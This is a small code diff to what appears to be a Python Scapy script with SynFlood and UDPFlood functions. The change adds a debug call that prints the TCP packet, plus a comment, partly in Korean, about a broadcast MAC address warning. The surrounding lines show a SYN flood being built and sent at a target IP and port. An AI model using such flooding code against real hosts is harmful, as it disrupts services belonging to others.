@@ -46,7 +46,11 @@ def SynFlood(dstIP,dstPort,repeat):
     TCP_Packet.dport = dstPort
     TCP_Packet.flags = "S"
     # TCP_Packet.seq = 
-    # TCP_Packet.window = 
+    # TCP_Packet.window 
+    ls(TCP_Packet) 
+    
+    # WARNING: Mac address to reach destination not found. Using broadcast.//IP 주소 설정 안하면 뜨던데?
+    # 
     send(IP_Packet/TCP_Packet,verbose=0)
 
 def UDPFlood(dstIP,dstPort,repeat):
